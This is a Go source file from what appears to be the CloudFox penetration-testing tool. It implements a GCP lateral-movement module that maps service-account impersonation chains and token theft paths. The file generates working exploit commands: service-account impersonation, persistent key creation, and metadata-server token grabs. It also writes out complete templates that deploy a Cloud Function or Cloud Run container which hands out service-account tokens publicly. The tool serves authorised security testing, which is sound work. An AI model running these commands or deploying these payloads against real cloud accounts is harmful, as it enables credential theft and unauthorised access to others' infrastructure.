package commands

import (
	"context"
	"fmt"
	"strings"
	"sync"

	CloudRunService "github.com/BishopFox/cloudfox/gcp/services/cloudrunService"
	ComputeEngineService "github.com/BishopFox/cloudfox/gcp/services/computeEngineService"
	FunctionsService "github.com/BishopFox/cloudfox/gcp/services/functionsService"
	GKEService "github.com/BishopFox/cloudfox/gcp/services/gkeService"
	IAMService "github.com/BishopFox/cloudfox/gcp/services/iamService"
	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	gcpinternal "github.com/BishopFox/cloudfox/internal/gcp"
	"github.com/spf13/cobra"
)

// Module name constant
const GCP_LATERALMOVEMENT_MODULE_NAME string = "lateral-movement"

var GCPLateralMovementCommand = &cobra.Command{
	Use:     GCP_LATERALMOVEMENT_MODULE_NAME,
	Aliases: []string{"lateral", "pivot"},
	Short:   "Map lateral movement paths, credential theft vectors, and pivot opportunities",
	Long: `Identify lateral movement opportunities within and across GCP projects.

Features:
- Maps service account impersonation chains (SA → SA → SA)
- Identifies token creator permissions (lateral movement via impersonation)
- Finds cross-project access paths
- Detects VM metadata abuse vectors
- Analyzes credential storage locations (secrets, environment variables)
- Maps attack paths from compromised identities
- Generates exploitation commands for penetration testing

This module helps identify how an attacker could move laterally after gaining
initial access to a GCP environment.`,
	Run: runGCPLateralMovementCommand,
}

// ------------------------------
// Data Structures
// ------------------------------

type ImpersonationChain struct {
	StartIdentity  string
	TargetSA       string
	ChainLength    int
	Path           []string // [identity] -> [sa1] -> [sa2] -> ...
	RiskLevel      string   // CRITICAL, HIGH, MEDIUM
	ExploitCommand string
}

type TokenTheftVector struct {
	ResourceType  string // "instance", "function", "cloudrun", etc.
	ResourceName  string
	ProjectID     string
	ServiceAccount string
	AttackVector  string // "metadata", "env_var", "startup_script", etc.
	RiskLevel     string
	ExploitCommand string
}

// ------------------------------
// Module Struct
// ------------------------------
type LateralMovementModule struct {
	gcpinternal.BaseGCPModule

	ImpersonationChains []ImpersonationChain
	TokenTheftVectors   []TokenTheftVector
	LootMap             map[string]*internal.LootFile
	mu                  sync.Mutex
}

// ------------------------------
// Output Struct
// ------------------------------
type LateralMovementOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (o LateralMovementOutput) TableFiles() []internal.TableFile { return o.Table }
func (o LateralMovementOutput) LootFiles() []internal.LootFile   { return o.Loot }

// ------------------------------
// Command Entry Point
// ------------------------------
func runGCPLateralMovementCommand(cmd *cobra.Command, args []string) {
	cmdCtx, err := gcpinternal.InitializeCommandContext(cmd, GCP_LATERALMOVEMENT_MODULE_NAME)
	if err != nil {
		return
	}

	module := &LateralMovementModule{
		BaseGCPModule:       gcpinternal.NewBaseGCPModule(cmdCtx),
		ImpersonationChains: []ImpersonationChain{},
		TokenTheftVectors:   []TokenTheftVector{},
		LootMap:             make(map[string]*internal.LootFile),
	}

	module.initializeLootFiles()
	module.Execute(cmdCtx.Ctx, cmdCtx.Logger)
}

// ------------------------------
// Module Execution
// ------------------------------
func (m *LateralMovementModule) Execute(ctx context.Context, logger internal.Logger) {
	logger.InfoM("Mapping lateral movement paths...", GCP_LATERALMOVEMENT_MODULE_NAME)

	// Process each project
	m.RunProjectEnumeration(ctx, logger, m.ProjectIDs, GCP_LATERALMOVEMENT_MODULE_NAME, m.processProject)

	// Check results
	totalPaths := len(m.ImpersonationChains) + len(m.TokenTheftVectors)
	if totalPaths == 0 {
		logger.InfoM("No lateral movement paths found", GCP_LATERALMOVEMENT_MODULE_NAME)
		return
	}

	logger.SuccessM(fmt.Sprintf("Found %d lateral movement path(s): %d impersonation chains, %d token theft vectors",
		totalPaths, len(m.ImpersonationChains), len(m.TokenTheftVectors)), GCP_LATERALMOVEMENT_MODULE_NAME)

	m.writeOutput(ctx, logger)
}

// ------------------------------
// Project Processor
// ------------------------------
func (m *LateralMovementModule) processProject(ctx context.Context, projectID string, logger internal.Logger) {
	if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
		logger.InfoM(fmt.Sprintf("Analyzing lateral movement paths in project: %s", projectID), GCP_LATERALMOVEMENT_MODULE_NAME)
	}

	// 1. Find impersonation chains
	m.findImpersonationChains(ctx, projectID, logger)

	// 2. Find token theft vectors (compute instances, functions, etc.)
	m.findTokenTheftVectors(ctx, projectID, logger)
}

// findImpersonationChains finds service account impersonation paths
func (m *LateralMovementModule) findImpersonationChains(ctx context.Context, projectID string, logger internal.Logger) {
	iamService := IAMService.New()

	// Get all service accounts
	serviceAccounts, err := iamService.ServiceAccounts(projectID)
	if err != nil {
		m.CommandCounter.Error++
		gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
			fmt.Sprintf("Could not get service accounts in project %s", projectID))
		return
	}

	// For each SA, check who can impersonate it using GetServiceAccountIAMPolicy
	for _, sa := range serviceAccounts {
		impersonationInfo, err := iamService.GetServiceAccountIAMPolicy(ctx, sa.Email, projectID)
		if err != nil {
			continue
		}

		// Token creators can impersonate
		for _, creator := range impersonationInfo.TokenCreators {
			// Skip allUsers/allAuthenticatedUsers - those are handled separately
			if creator == "allUsers" || creator == "allAuthenticatedUsers" {
				continue
			}

			chain := ImpersonationChain{
				StartIdentity:  creator,
				TargetSA:       sa.Email,
				ChainLength:    1,
				Path:           []string{creator, sa.Email},
				RiskLevel:      "HIGH",
				ExploitCommand: fmt.Sprintf("gcloud auth print-access-token --impersonate-service-account=%s", sa.Email),
			}

			// If target SA has roles/owner or roles/editor, it's critical
			if impersonationInfo.RiskLevel == "CRITICAL" {
				chain.RiskLevel = "CRITICAL"
			}

			m.mu.Lock()
			m.ImpersonationChains = append(m.ImpersonationChains, chain)
			m.addImpersonationChainToLoot(chain, projectID)
			m.mu.Unlock()
		}

		// Key creators can create persistent access
		for _, creator := range impersonationInfo.KeyCreators {
			if creator == "allUsers" || creator == "allAuthenticatedUsers" {
				continue
			}

			chain := ImpersonationChain{
				StartIdentity:  creator,
				TargetSA:       sa.Email,
				ChainLength:    1,
				Path:           []string{creator, sa.Email},
				RiskLevel:      "CRITICAL",
				ExploitCommand: fmt.Sprintf("gcloud iam service-accounts keys create key.json --iam-account=%s", sa.Email),
			}

			m.mu.Lock()
			m.ImpersonationChains = append(m.ImpersonationChains, chain)
			m.addImpersonationChainToLoot(chain, projectID)
			m.mu.Unlock()
		}
	}
}

// findTokenTheftVectors finds compute resources where tokens can be stolen
func (m *LateralMovementModule) findTokenTheftVectors(ctx context.Context, projectID string, logger internal.Logger) {
	// Find Compute Engine instances with service accounts
	m.findComputeInstanceVectors(ctx, projectID, logger)

	// Find Cloud Functions with service accounts
	m.findCloudFunctionVectors(ctx, projectID, logger)

	// Find Cloud Run services with service accounts
	m.findCloudRunVectors(ctx, projectID, logger)

	// Find GKE clusters with node service accounts
	m.findGKEVectors(ctx, projectID, logger)
}

// findComputeInstanceVectors finds compute instances where tokens can be stolen via metadata server
func (m *LateralMovementModule) findComputeInstanceVectors(ctx context.Context, projectID string, logger internal.Logger) {
	computeService := ComputeEngineService.New()

	instances, err := computeService.Instances(projectID)
	if err != nil {
		// Don't count as error - API may not be enabled
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get compute instances in project %s", projectID))
		}
		return
	}

	for _, instance := range instances {
		// Skip instances without service accounts
		if len(instance.ServiceAccounts) == 0 {
			continue
		}

		for _, sa := range instance.ServiceAccounts {
			// Skip default compute SA if it has no useful scopes
			if sa.Email == "" {
				continue
			}

			vector := TokenTheftVector{
				ResourceType:   "compute_instance",
				ResourceName:   instance.Name,
				ProjectID:      projectID,
				ServiceAccount: sa.Email,
				AttackVector:   "metadata_server",
				RiskLevel:      "HIGH",
				ExploitCommand: fmt.Sprintf(`# SSH into instance and steal token
gcloud compute ssh %s --zone=%s --project=%s --command='curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"'`,
					instance.Name, instance.Zone, projectID),
			}

			m.mu.Lock()
			m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
			m.addTokenTheftVectorToLoot(vector)
			m.mu.Unlock()
		}
	}
}

// findCloudFunctionVectors finds Cloud Functions where tokens can be stolen
func (m *LateralMovementModule) findCloudFunctionVectors(ctx context.Context, projectID string, logger internal.Logger) {
	functionsService := FunctionsService.New()

	functions, err := functionsService.Functions(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get Cloud Functions in project %s", projectID))
		}
		return
	}

	for _, fn := range functions {
		if fn.ServiceAccount == "" {
			continue
		}

		// Generate exploit with PoC code, deploy command, and invoke command
		exploitCmd := fmt.Sprintf(`# Target: Cloud Function %s
# Service Account: %s
# Region: %s

# Step 1: Create token exfiltration function code
mkdir -p /tmp/token-theft-%s && cd /tmp/token-theft-%s

cat > main.py << 'PYEOF'
import functions_framework
import requests

@functions_framework.http
def steal_token(request):
    # Fetch SA token from metadata server
    token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    headers = {"Metadata-Flavor": "Google"}
    resp = requests.get(token_url, headers=headers)
    token_data = resp.json()

    # Fetch SA email
    email_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
    email_resp = requests.get(email_url, headers=headers)

    return {
        "service_account": email_resp.text,
        "access_token": token_data.get("access_token"),
        "token_type": token_data.get("token_type"),
        "expires_in": token_data.get("expires_in")
    }
PYEOF

cat > requirements.txt << 'REQEOF'
functions-framework==3.*
requests==2.*
REQEOF

# Step 2: Deploy function with target SA (requires cloudfunctions.functions.create + iam.serviceAccounts.actAs)
gcloud functions deploy token-theft-poc \
    --gen2 \
    --runtime=python311 \
    --region=%s \
    --source=. \
    --entry-point=steal_token \
    --trigger-http \
    --allow-unauthenticated \
    --service-account=%s \
    --project=%s

# Step 3: Invoke function to get token
curl -s $(gcloud functions describe token-theft-poc --region=%s --project=%s --format='value(url)')

# Cleanup
gcloud functions delete token-theft-poc --region=%s --project=%s --quiet`,
			fn.Name, fn.ServiceAccount, fn.Region,
			fn.Name, fn.Name,
			fn.Region, fn.ServiceAccount, projectID,
			fn.Region, projectID,
			fn.Region, projectID)

		vector := TokenTheftVector{
			ResourceType:   "cloud_function",
			ResourceName:   fn.Name,
			ProjectID:      projectID,
			ServiceAccount: fn.ServiceAccount,
			AttackVector:   "function_execution",
			RiskLevel:      "HIGH",
			ExploitCommand: exploitCmd,
		}

		m.mu.Lock()
		m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
		m.addTokenTheftVectorToLoot(vector)
		m.mu.Unlock()
	}
}

// findCloudRunVectors finds Cloud Run services where tokens can be stolen
func (m *LateralMovementModule) findCloudRunVectors(ctx context.Context, projectID string, logger internal.Logger) {
	cloudRunService := CloudRunService.New()

	services, err := cloudRunService.Services(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get Cloud Run services in project %s", projectID))
		}
		return
	}

	for _, svc := range services {
		if svc.ServiceAccount == "" {
			continue
		}

		// Generate exploit with PoC code, deploy command, and invoke command
		exploitCmd := fmt.Sprintf(`# Target: Cloud Run Service %s
# Service Account: %s
# Region: %s

# Step 1: Create token exfiltration container
mkdir -p /tmp/cloudrun-theft-%s && cd /tmp/cloudrun-theft-%s

cat > main.py << 'PYEOF'
from flask import Flask, jsonify
import requests
import os

app = Flask(__name__)

@app.route("/")
def steal_token():
    # Fetch SA token from metadata server
    token_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
    headers = {"Metadata-Flavor": "Google"}
    resp = requests.get(token_url, headers=headers)
    token_data = resp.json()

    # Fetch SA email
    email_url = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
    email_resp = requests.get(email_url, headers=headers)

    return jsonify({
        "service_account": email_resp.text,
        "access_token": token_data.get("access_token"),
        "token_type": token_data.get("token_type"),
        "expires_in": token_data.get("expires_in")
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
PYEOF

cat > requirements.txt << 'REQEOF'
flask==3.*
requests==2.*
gunicorn==21.*
REQEOF

cat > Dockerfile << 'DOCKEOF'
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY main.py .
CMD exec gunicorn --bind :$PORT --workers 1 --threads 8 --timeout 0 main:app
DOCKEOF

# Step 2: Build and push container
gcloud builds submit --tag gcr.io/%s/token-theft-poc --project=%s

# Step 3: Deploy Cloud Run service with target SA (requires run.services.create + iam.serviceAccounts.actAs)
gcloud run deploy token-theft-poc \
    --image gcr.io/%s/token-theft-poc \
    --region=%s \
    --service-account=%s \
    --allow-unauthenticated \
    --project=%s

# Step 4: Invoke service to get token
curl -s $(gcloud run services describe token-theft-poc --region=%s --project=%s --format='value(status.url)')

# Cleanup
gcloud run services delete token-theft-poc --region=%s --project=%s --quiet
gcloud container images delete gcr.io/%s/token-theft-poc --quiet --force-delete-tags`,
			svc.Name, svc.ServiceAccount, svc.Region,
			svc.Name, svc.Name,
			projectID, projectID,
			projectID, svc.Region, svc.ServiceAccount, projectID,
			svc.Region, projectID,
			svc.Region, projectID,
			projectID)

		vector := TokenTheftVector{
			ResourceType:   "cloud_run",
			ResourceName:   svc.Name,
			ProjectID:      projectID,
			ServiceAccount: svc.ServiceAccount,
			AttackVector:   "container_execution",
			RiskLevel:      "HIGH",
			ExploitCommand: exploitCmd,
		}

		m.mu.Lock()
		m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
		m.addTokenTheftVectorToLoot(vector)
		m.mu.Unlock()
	}
}

// findGKEVectors finds GKE clusters/node pools where tokens can be stolen
func (m *LateralMovementModule) findGKEVectors(ctx context.Context, projectID string, logger internal.Logger) {
	gkeService := GKEService.New()

	clusters, nodePools, err := gkeService.Clusters(projectID)
	if err != nil {
		if globals.GCP_VERBOSITY >= globals.GCP_VERBOSE_ERRORS {
			gcpinternal.HandleGCPError(err, logger, GCP_LATERALMOVEMENT_MODULE_NAME,
				fmt.Sprintf("Could not get GKE clusters in project %s", projectID))
		}
		return
	}

	// Track cluster SAs to avoid duplicates in node pools
	clusterSAs := make(map[string]string) // clusterName -> SA

	for _, cluster := range clusters {
		// Check node service account
		if cluster.NodeServiceAccount != "" {
			clusterSAs[cluster.Name] = cluster.NodeServiceAccount

			var exploitCmd string
			if cluster.WorkloadIdentity != "" {
				exploitCmd = fmt.Sprintf(`# Cluster uses Workload Identity - tokens are pod-specific
# Get credentials for cluster:
gcloud container clusters get-credentials %s --location=%s --project=%s
# Then exec into a pod and check for mounted SA token:
kubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token`,
					cluster.Name, cluster.Location, projectID)
			} else {
				exploitCmd = fmt.Sprintf(`# Cluster uses node SA (no Workload Identity) - all pods can access node SA
gcloud container clusters get-credentials %s --location=%s --project=%s
# Exec into any pod and steal node SA token:
kubectl exec -it <pod> -- curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"`,
					cluster.Name, cluster.Location, projectID)
			}

			vector := TokenTheftVector{
				ResourceType:   "gke_cluster",
				ResourceName:   cluster.Name,
				ProjectID:      projectID,
				ServiceAccount: cluster.NodeServiceAccount,
				AttackVector:   "pod_service_account",
				RiskLevel:      "HIGH",
				ExploitCommand: exploitCmd,
			}

			m.mu.Lock()
			m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
			m.addTokenTheftVectorToLoot(vector)
			m.mu.Unlock()
		}
	}

	// Process node pools with different SAs than their cluster
	for _, np := range nodePools {
		clusterSA := clusterSAs[np.ClusterName]
		if np.ServiceAccount == "" || np.ServiceAccount == clusterSA {
			continue // Skip if same as cluster SA or empty
		}

		exploitCmd := fmt.Sprintf(`# Node pool %s uses specific SA
gcloud container clusters get-credentials %s --location=%s --project=%s
# Exec into pod running on this node pool and steal token`,
			np.Name, np.ClusterName, np.Location, projectID)

		vector := TokenTheftVector{
			ResourceType:   "gke_nodepool",
			ResourceName:   fmt.Sprintf("%s/%s", np.ClusterName, np.Name),
			ProjectID:      projectID,
			ServiceAccount: np.ServiceAccount,
			AttackVector:   "pod_service_account",
			RiskLevel:      "HIGH",
			ExploitCommand: exploitCmd,
		}

		m.mu.Lock()
		m.TokenTheftVectors = append(m.TokenTheftVectors, vector)
		m.addTokenTheftVectorToLoot(vector)
		m.mu.Unlock()
	}
}

// ------------------------------
// Loot File Management
// ------------------------------
func (m *LateralMovementModule) initializeLootFiles() {
	m.LootMap["impersonation-chains-commands"] = &internal.LootFile{
		Name:     "impersonation-chains-commands",
		Contents: "# Impersonation Chain Exploit Commands\n# Generated by CloudFox\n\n",
	}
	m.LootMap["token-theft-commands"] = &internal.LootFile{
		Name:     "token-theft-commands",
		Contents: "# Token Theft Exploit Commands\n# Generated by CloudFox\n\n",
	}
}

func (m *LateralMovementModule) addImpersonationChainToLoot(chain ImpersonationChain, projectID string) {
	m.LootMap["impersonation-chains-commands"].Contents += fmt.Sprintf(
		"# Impersonation: %s -> %s\n"+
			"# Path: %s\n"+
			"%s\n\n",
		chain.StartIdentity,
		chain.TargetSA,
		strings.Join(chain.Path, " -> "),
		chain.ExploitCommand,
	)
}

func (m *LateralMovementModule) addTokenTheftVectorToLoot(vector TokenTheftVector) {
	m.LootMap["token-theft-commands"].Contents += fmt.Sprintf(
		"# Token Theft: %s (%s)\n"+
			"# Project: %s\n"+
			"# Service Account: %s\n"+
			"# Attack Vector: %s\n"+
			"%s\n\n",
		vector.ResourceType,
		vector.ResourceName,
		vector.ProjectID,
		vector.ServiceAccount,
		vector.AttackVector,
		vector.ExploitCommand,
	)
}

// ------------------------------
// Output Generation
// ------------------------------
func (m *LateralMovementModule) writeOutput(ctx context.Context, logger internal.Logger) {
	// Impersonation chains table
	// Reads: Source identity can perform action on target service account
	chainsHeader := []string{
		"Source Identity",
		"Action",
		"Target Service Account",
		"Impersonation Path",
	}

	var chainsBody [][]string
	for _, chain := range m.ImpersonationChains {
		// Determine action based on exploit command
		action := "impersonate (get token)"
		if strings.Contains(chain.ExploitCommand, "keys create") {
			action = "create key"
		}

		chainsBody = append(chainsBody, []string{
			chain.StartIdentity,
			action,
			chain.TargetSA,
			strings.Join(chain.Path, " -> "),
		})
	}

	// Token theft vectors table
	vectorsHeader := []string{
		"Project Name",
		"Project ID",
		"Source Resource Type",
		"Source Resource Name",
		"Action",
		"Target Service Account",
	}

	var vectorsBody [][]string
	for _, vector := range m.TokenTheftVectors {
		// Map attack vector to action description
		action := vector.AttackVector
		switch vector.AttackVector {
		case "metadata_server":
			action = "steal token (metadata)"
		case "function_execution":
			action = "steal token (function)"
		case "container_execution":
			action = "steal token (container)"
		case "pod_service_account":
			action = "steal token (pod)"
		}

		vectorsBody = append(vectorsBody, []string{
			m.GetProjectName(vector.ProjectID),
			vector.ProjectID,
			vector.ResourceType,
			vector.ResourceName,
			action,
			vector.ServiceAccount,
		})
	}

	// Collect loot files
	var lootFiles []internal.LootFile
	for _, loot := range m.LootMap {
		if loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# Generated by CloudFox\n\n") {
			lootFiles = append(lootFiles, *loot)
		}
	}

	// Build tables
	tables := []internal.TableFile{}

	if len(chainsBody) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "lateral-impersonation-chains",
			Header: chainsHeader,
			Body:   chainsBody,
		})
		logger.InfoM(fmt.Sprintf("[PENTEST] Found %d impersonation chain(s)", len(chainsBody)), GCP_LATERALMOVEMENT_MODULE_NAME)
	}

	if len(vectorsBody) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "lateral-token-theft",
			Header: vectorsHeader,
			Body:   vectorsBody,
		})
	}

	output := LateralMovementOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	// Build scopeNames using GetProjectName
	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	// Write output
	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), GCP_LATERALMOVEMENT_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
